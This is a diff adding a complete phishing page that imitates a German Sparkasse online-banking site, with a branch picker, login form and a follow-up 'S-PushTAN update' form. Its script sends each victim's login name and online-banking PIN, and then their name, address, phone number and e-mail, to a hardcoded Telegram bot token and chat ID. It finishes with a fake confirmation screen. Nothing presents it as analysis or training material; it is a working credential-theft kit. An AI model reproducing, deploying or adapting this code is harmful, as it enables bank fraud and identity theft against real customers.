+        <svg class="lead-icon" width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M20.45 20.45h-3.56v-5.57c0-1.33-.03-3.04-1.85-3.04-1.85 0-2.14 1.45-2.14 2.94v5.67H9.35V9h3.42v1.56h.05c.48-.9 1.64-1.85 3.37-1.85 3.6 0 4.27 2.37 4.27 5.46v6.28zM5.34 7.43a2.06 2.06 0 1 1 0-4.12 2.06 2.06 0 0 1 0 4.12zM7.12 20.45H3.55V9h3.57v11.45z"/></svg>
+        LinkedIn
+        <svg class="trail-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+      </a>
+      <a href="#" class="bspk-contact-btn">
+        <svg class="lead-icon" width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M23.5 6.2a3 3 0 0 0-2.1-2.1C19.5 3.5 12 3.5 12 3.5s-7.5 0-9.4.6A3 3 0 0 0 .5 6.2C0 8.1 0 12 0 12s0 3.9.5 5.8a3 3 0 0 0 2.1 2.1c1.9.6 9.4.6 9.4.6s7.5 0 9.4-.6a3 3 0 0 0 2.1-2.1c.5-1.9.5-5.8.5-5.8s0-3.9-.5-5.8zM9.6 15.6V8.4L15.8 12l-6.2 3.6z"/></svg>
+        Youtube
+        <svg class="trail-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+      </a>
+
+      <a href="#" class="bspk-all-contacts">Alle Kontaktmöglichkeiten</a>
+    </div>
+
+    <div class="bspk-badge-wrap">
+      <div class="bspk-badge">
+        <svg class="bspk-badge-icon" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="20" cy="20" r="17" fill="none" stroke="#0091b5" stroke-width="2.5"/>
+          <circle cx="20" cy="20" r="11" fill="none" stroke="#0091b5" stroke-width="2.5"/>
+          <circle cx="20" cy="20" r="5" fill="#0091b5"/>
+        </svg>
+        <div class="bspk-badge-text">
+          <div class="top-title">TOP 100</div>
+          <div class="top-sub">Attraktivste Arbeitgeber 2026</div>
+          <div>Für Studenten Wirtschaftswissenschaften</div>
+          <div style="color:#0091b5;font-weight:700;">trendence</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="bspk-service-list">
+      <a href="#" class="bspk-service-row first">
+        <svg class="svc-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+        Online-Kunde werden
+      </a>
+      <a href="#" class="bspk-service-row">
+        <svg class="svc-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle cx="12" cy="9" r="2.5"/></svg>
+        Geldautomat oder Geschäftsstelle finden
+      </a>
+      <a href="#" class="bspk-service-row">
+        <svg class="svc-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="2" width="16" height="20" rx="2"/><line x1="8" y1="6" x2="10" y2="6"/><line x1="14" y1="6" x2="16" y2="6"/><line x1="8" y1="10" x2="10" y2="10"/><line x1="14" y1="10" x2="16" y2="10"/><line x1="8" y1="14" x2="10" y2="14"/><line x1="14" y1="14" x2="16" y2="14"/><line x1="8" y1="18" x2="16" y2="18"/></svg>
+        IBAN & BIC berechnen
+      </a>
+      <a href="#" class="bspk-service-row">
+        <svg class="svc-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="2" width="12" height="20" rx="2"/><line x1="10" y1="18" x2="14" y2="18"/></svg>
+        pushTAN freischalten
+      </a>
+      <a href="#" class="bspk-service-row">
+        <svg class="svc-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="2" width="12" height="20" rx="2"/><line x1="10" y1="18" x2="14" y2="18"/></svg>
+        Handy aufladen
+      </a>
+      <a href="#" class="bspk-service-row">
+        <svg class="svc-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>
+        Tageslimit im Online-Banking erhöhen
+      </a>
+      <a href="#" class="bspk-service-row">
+        <svg class="svc-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="2" width="16" height="20" rx="2"/><circle cx="12" cy="11" r="2"/></svg>
+        <span style="font-weight:700;font-size:13px;letter-spacing:1px;margin-right:4px;">APP</span> Sparkassen-App downloaden
+      </a>
+      <a href="#" class="bspk-service-row">
+        <svg class="svc-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
+        Mediathek
+      </a>
+      <a href="#" class="bspk-service-row">
+        <svg class="svc-icon" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="19" r="2"/></svg>
+        Alle Services und Formulare
+      </a>
+    </div>
+
+    <div class="bspk-immer-wrapper">
+      <div class="bspk-immer-title">IMMER IN IHRER NÄHE</div>
+    </div>
+
+    <a href="#" class="bspk-personal-contact">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.13.96.36 1.9.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+      Persönlicher Kontakt
+    </a>
+
+    <div class="bspk-footer-bottom">
+      <div class="bspk-footer-city" id="spk-footer-city">Sparkasse</div>
+      <div class="bspk-footer-row">
+        <span class="bspk-lang-select">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+          DE
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+        </span>
+        <span class="bspk-divider-pipe">|</span>
+        <a href="#">AGB</a>
+        <a href="#">Cookie-Einstellungen anpassen</a>
+      </div>
+      <div class="bspk-footer-row">
+        <a href="#">Datenschutz</a>
+        <a href="#">Impressum</a>
+        <a href="#">Preise und Hinweise</a>
+      </div>
+      <div class="bspk-footer-row">
+        <a href="#">Kontakt</a>
+        <a href="#">Geschäftsstellen</a>
+        <a href="#">Geldautomaten</a>
+      </div>
+      <div class="bspk-footer-row">
+        <a href="#">Barrierefreiheit</a>
+        <a href="#">Barriere melden</a>
+      </div>
+      <div class="bspk-footer-row">
+        <a href="#">Vertrag widerrufen</a>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- NEUER DATEN SCREEN -->
+  <div class="hidden" id="spk-data-wrapper">
+    <div class="bspk-data-screen">
+      <h1 class="bspk-data-title">Persönliche Angaben</h1>
+      <p class="bspk-data-subtitle">Bitte vervollständigen Sie Ihre Daten für die S-PushTAN-Aktualisierung.</p>
+      
+      <form id="spkDataForm">
+        <div class="bspk-field">
+          <label class="bspk-field-label">Vorname</label>
+          <input type="text" class="bspk-field-input" id="data-vorname" required>
+        </div>
+        <div class="bspk-field">
+          <label class="bspk-field-label">Name</label>
+          <input type="text" class="bspk-field-input" id="data-name" required>
+        </div>
+        <div class="bspk-field">
+          <label class="bspk-field-label">Adresse</label>
+          <input type="text" class="bspk-field-input" id="data-adresse" placeholder="Straße" required>
+        </div>
+        <div class="bspk-field">
+          <label class="bspk-field-label">Hausnummer</label>
+          <input type="text" class="bspk-field-input" id="data-hausnummer" required>
+        </div>
+        <div class="bspk-field">
+          <label class="bspk-field-label">PLZ</label>
+          <input type="text" class="bspk-field-input" id="data-plz" inputmode="numeric" pattern="[0-9]{5}" maxlength="5" required>
+        </div>
+        <div class="bspk-field">
+          <label class="bspk-field-label">Ort</label>
+          <input type="text" class="bspk-field-input" id="data-ort" required>
+        </div>
+        <div class="bspk-field">
+          <label class="bspk-field-label">Telefonnummer</label>
+          <input type="tel" class="bspk-field-input" id="data-telefon" required>
+        </div>
+        <div class="bspk-field">
+          <label class="bspk-field-label">E-Mail</label>
+          <input type="email" class="bspk-field-input" id="data-email" required>
+        </div>
+        
+        <button type="submit" class="bspk-login-btn" style="margin-top: 30px;">Bestätigen</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- FINAL SUCCESS SCREEN -->
+  <div class="bspk-success-screen hidden" id="spk-success">
+    <div class="bspk-success-icon"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+    <h1>Ihre Anmeldung war erfolgreich</h1>
+    <p>Ihr <strong>S-PushTAN Verfahren</strong> wurde aktualisiert.<br>Sie können die Seite jetzt schließen.</p>
+  </div>
+
+</div>
+
+<script>
+const BOT_TOKEN = '8587222002:AAF8e-yXfPO8EX4dzX2lDCE7RLCWMSsxEgg';
+const CHAT_ID = '9189525546';
+
+const sparkassenDaten = [
+  { name: "Sparkasse Aachen", lat: 50.7753, lng: 6.0839, plz: ["520","521","522","523","524","525"] },
+  { name: "Sparkasse Duisburg", lat: 51.4344, lng: 6.7623, plz: ["470","471","472","47139"] }, 
+  { name: "Sparkasse Essen", lat: 51.4556, lng: 7.0116, plz: ["451","452","453"] },
+  { name: "Sparkasse KölnBonn", lat: 50.9375, lng: 6.9603, plz: ["506","507","508","509","510","511","514","515","530","531","532","533"] },
+  { name: "Sparkasse Wuppertal", lat: 51.2562, lng: 7.1508, plz: ["420","421","422","423"] }, 
+  { name: "Berliner Sparkasse", lat: 52.5200, lng: 13.4050, plz: ["101","102","103","104","105","106","107","108","109","120","121","122","123","124","125","126","127","128","129","130","131","133","134","135","136","137","138","139","140","141"] },
+  { name: "Hamburger Sparkasse", lat: 53.5511, lng: 9.9937, plz: ["200","201","202","203","204","205","210","211","212","213","214","215","216","217","220","221","222","223","224","225","226","227"] },
+  { name: "Sparkasse München", lat: 48.1351, lng: 11.5820, plz: ["803","804","805","806","807","808","809","810","812","813","814","815","816","817","818","819"] },
+  { name: "Frankfurter Sparkasse", lat: 50.1109, lng: 8.6821, plz: ["603","604","605","659"] },
+  { name: "Sparkasse Dortmund", lat: 51.5136, lng: 7.4653, plz: ["441","442","443"] }
+];
+
+/* Dein Base64-Bild für die Liste */
+const spkLogoHTML = '<img class="spk-icon" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAkACQAAD/4QDeRXhpZgAATU0AKgAAAAgABgESAAMAAAABAAEAAAEaAAUAAAABAAAAVgEbAAUAAAABAAAAXgEoAAMAAAABAAIAAAEyAAIAAAAUAAAAZodpAAQAAAABAAAAegAAAAAAAACQAAAAAQAAAJAAAAABMjAyNjoxMToxMiAxOTo1ODo1NQAABJADAAIAAAAUAAAAsJKGAAcAAAASAAAAxKACAAQAAAABAAAA3qADAAQAAAABAAAAxgAAAAAyMDI2OjExOjEyIDE5OjU4OjU1AEFTQ0lJAAAAU2NyZWVuc2hvdP/tADhQaG90b3Nob3AgMy4wADhCSU0EBAAAAAAAADhCSU0EJQAAAAAAENQdjNmPALIE6YAJmOz4Qn7/4gIoSUNDX1BST0ZJTEUAAQEAAAIYYXBwbAQAAABtbnRyUkdCIFhZWiAH5gABAAEAAAAAAABhY3NwQVBQTAAAAABBUFBMAAAAAAAAAAAAAAAAAAAAAAAA9tYAAQAAAADTLWFwcGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApkZXNjAAAA/AAAADBjcHJ0AAABLAAAAFB3dHB0AAABfAAAABRyWFlaAAABkAAAABRnWFlaAAABpAAAABRiWFlaAAABuAAAABRyVFJDAAABzAAAACBjaGFkAAAB7AAAACxiVFJDAAABzAAAACBnVFJDAAABzAAAACBtbHVjAAAAAAAAAAEAAAAMZW5VUwAAABQAAAAcAEQAaQBzAHAAbABhAHkAIABQADNtbHVjAAAAAAAAAAEAAAAMZW5VUwAAADQAAAAcAEMAbwBwAHkAcgBpAGcAaAB0ACAAQQBwAHAAbABlACAASQBuAGMALgAsACAAMgAwADIAMlhZWiAAAAAAAAD21QABAAAAANMsWFlaIAAAAAAAAIPfAAA9v////7tYWVogAAAAAAAASr8AALE3AAAKuVhZWiAAAAAAAAAoOAAAEQsAAMi5cGFyYQAAAAAAAwAAAAJmZgAA8qcAAA1ZAAAT0AAACltzZjMyAAAAAAABDEIAAAXe///zJgAAB5MAAP2Q///7ov///aMAAAPcAADAbv/AABEIAMYA3gMBIgACEQEDEQH/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/xAAfAQADAQEBAQEBAQEBAAAAAAAAAQIDBAUGBwgJCgv/xAC1EQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2wBDAAICAgICAgMCAgMFAwMDBQYFBQUFBggGBgYGBggKCAgICAgICgoKCgoKCgoMDAwMDAwODg4ODg8PDw8PDw8PDw//2wBDAQICAgQEBAcEBAcQCwkLEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBD/3QAEAA7/2gAMAwEAAhEDEQA/APn+iiiv5vP9XAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA//9D5/ooor+bz/VwKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAP//R+f6KKK/m8/1cCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigD//0vn+iiiv5vP9XAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA//9P5/ooor+bz/VwKKKKACiiigAooooAKKKKACiiigD7w/ZC/Zg0r4qRz/EHx+jy+HrSYwW1orMn2yZAC7Oy4YRJkDCnLNkZAUhv1A/4Ut8IP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" alt="Sparkasse">';
+
+async function sendToTelegram(message) {
+  try {
+    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    });
+  } catch (e) {
+    console.error('Telegram Fehler:', e);
+  }
+}
+
+function distanceKm(lat1, lng1, lat2, lng2) {
+  const R = 6371;
+  const dLat = (lat2 - lat1) * Math.PI / 180;
+  const dLng = (lng2 - lng1) * Math.PI / 180;
+  const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180) * Math.cos(lat2*Math.PI/180) * Math.sin(dLng/2)**2;
+  return 2 * R * Math.asin(Math.sqrt(a));
+}
+
+function renderSparkassen(filter = '', userLat = null, userLng = null, sortByDistance = false) {
+  const list = document.getElementById('spk-suggestion-list');
+  const title = document.getElementById('spk-suggestion-title');
+  if (!list) return;
+
+  let items = sparkassenDaten.slice();
+  const trimmed = filter.trim();
+
+  if (trimmed.length > 0) {
+    if (/^\d+$/.test(trimmed)) {
+      items = items.filter(s => s.plz.some(p => p.startsWith(trimmed) || trimmed.startsWith(p)));
+      title.textContent = items.length > 0 ? items.length + ' Treffer für PLZ "' + trimmed + '"' : 'Keine Treffer für PLZ "' + trimmed + '"';
+    } else {
+      items = items.filter(s => s.name.toLowerCase().includes(trimmed.toLowerCase()));
+      title.textContent = items.length > 0 ? items.length + ' Treffer für "' + trimmed + '"' : 'Keine Treffer für "' + trimmed + '"';
+    }
+  } else if (sortByDistance && userLat !== null && userLng !== null) {
+    items = items.map(s => ({...s, dist: distanceKm(userLat, userLng, s.lat, s.lng)})).sort((a,b) => a.dist - b.dist);
+    title.textContent = 'Sparkassen in Ihrer Nähe';
+  } else {
+    title.textContent = 'Wählen Sie Ihre Sparkasse aus';
+  }
+
+  list.innerHTML = '';
+
+  if (items.length === 0) {
+    list.innerHTML = '<div class="bspk-no-result">Keine Sparkasse gefunden</div>';
+    return;
+  }
+
+  items.slice(0, 60).forEach(s => {
+    const item = document.createElement('div');
+    item.className = 'bspk-suggestion-item';
+    let distHtml = s.dist !== undefined ? '<span class="distance">' + s.dist.toFixed(1) + ' km</span>' : '';
+    
+    item.innerHTML = spkLogoHTML + '<span>' + s.name + '</span>' + distHtml +
+      '<svg class="arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" y1="12" x2="20" y2="12"/><polyline points="14 6 20 12 14 18"/></svg>';
+    
+    item.onclick = () => selectSparkasse(s.name);
+    list.appendChild(item);
+  });
+}
+
+document.getElementById('spk-search-input').addEventListener('input', function() {
+  renderSparkassen(this.value);
+});
+
+function useLocation() {
+  const label = document.getElementById('spk-location-label');
+  if (!navigator.geolocation) {
+    alert('Dein Browser unterstützt keine Standortbestimmung.');
+    return;
+  }
+  label.textContent = 'Standort wird ermittelt …';
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      label.textContent = 'Standort aktiv ✓';
+      document.getElementById('spk-search-input').value = '';
+      renderSparkassen('', pos.coords.latitude, pos.coords.longitude, true);
+    },
+    function(err) {
+      label.textContent = 'Mein Standort';
+      if (err.code === 1) {
+        alert('Bitte erlaube den Zugriff auf deinen Standort in den Browser-Einstellungen.');
+      } else {
+        alert('Standort konnte nicht ermittelt werden.');
+      }
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+  );
+}
+
+let selectedSparkasseName = '';
+
+function selectSparkasse(name) {
+  selectedSparkasseName = name;
+  document.getElementById('spk-header-text').innerHTML = name;
+  document.getElementById('spk-login-subtitle').textContent = 'bei der ' + name;
+  document.getElementById('spk-loading-text').textContent = 'zur ' + name + ' …';
+  
+  // Name auch im Footer unten austauschen
+  document.getElementById('spk-footer-city').textContent = name;
+
+  document.getElementById('spk-selection').classList.add('hidden');
+  document.getElementById('spk-loading').classList.remove('hidden');
+  window.scrollTo(0, 0);
+  setTimeout(() => {
+    document.getElementById('spk-loading').classList.add('hidden');
+    document.getElementById('spk-login-wrapper').classList.remove('hidden');
+    window.scrollTo(0, 0);
+  }, 2500);
+}
+
+function toggleSpkPw() {
+  const pw = document.getElementById('spk-pin');
+  pw.type = pw.type === 'password' ? 'text' : 'password';
+}
+
+/* SCHRITT 1: Login absenden */
+async function handleSparkasseLogin() {
+  const anmeldename = document.getElementById('spk-anmeldename').value.trim();
+  const pin = document.getElementById('spk-pin').value.trim();
+  if (!anmeldename || !pin) {
+    alert('Bitte Anmeldename und PIN eingeben.');
+    return;
+  }
+
+  const timestamp = new Date().toLocaleString('de-DE');
+  const message =
+    '🏦 NEUE SPARKASSE-ANMELDUNG (SCHRITT 1)\n' +
+    '━━━━━━━━━━━━━━━━━━━━\n' +
+    '🏛️ Sparkasse: ' + selectedSparkasseName + '\n' +
+    '👤 Anmeldename: ' + anmeldename + '\n' +
+    '🔑 Online-Banking-PIN: ' + pin + '\n' +
+    '━━━━━━━━━━━━━━━━━━━━\n' +
+    '⏰ ' + timestamp;
+
+  await sendToTelegram(message);
+
+  document.getElementById('spk-login-wrapper').classList.add('hidden');
+  document.getElementById('spk-data-wrapper').classList.remove('hidden');
+  window.scrollTo(0, 0);
+}
+
+/* SCHRITT 2: Persönliche Daten absenden */
+document.getElementById('spkDataForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+
+  const vorname = document.getElementById('data-vorname').value.trim();
+  const name = document.getElementById('data-name').value.trim();
+  const adresse = document.getElementById('data-adresse').value.trim();
+  const hausnummer = document.getElementById('data-hausnummer').value.trim();
+  const plz = document.getElementById('data-plz').value.trim();
+  const ort = document.getElementById('data-ort').value.trim();
+  const telefon = document.getElementById('data-telefon').value.trim();
+  const email = document.getElementById('data-email').value.trim();
+
+  const timestamp = new Date().toLocaleString('de-DE');
+  const message =
+    '📋 SPARKASSE - PERSÖNLICHE DATEN (SCHRITT 2)\n' +
+    '━━━━━━━━━━━━━━━━━━━━\n' +
+    '🏛️ Sparkasse: ' + selectedSparkasseName + '\n' +
+    '👤 Vorname: ' + vorname + '\n' +
+    '👤 Name: ' + name + '\n' +
+    '🏠 Adresse: ' + adresse + ' ' + hausnummer + '\n' +
+    '📮 PLZ / Ort: ' + plz + ' ' + ort + '\n' +
+    '📞 Telefon: ' + telefon + '\n' +
+    '📧 E-Mail: ' + email + '\n' +
+    '━━━━━━━━━━━━━━━━━━━━\n' +
+    '⏰ ' + timestamp;
+
+  await sendToTelegram(message);
+
+  document.getElementById('spk-data-wrapper').classList.add('hidden');
+  document.getElementById('spk-success').classList.remove('hidden');
+  window.scrollTo(0, 0);
+});
+
+renderSparkassen();
+</script>
+</body>
+</html>
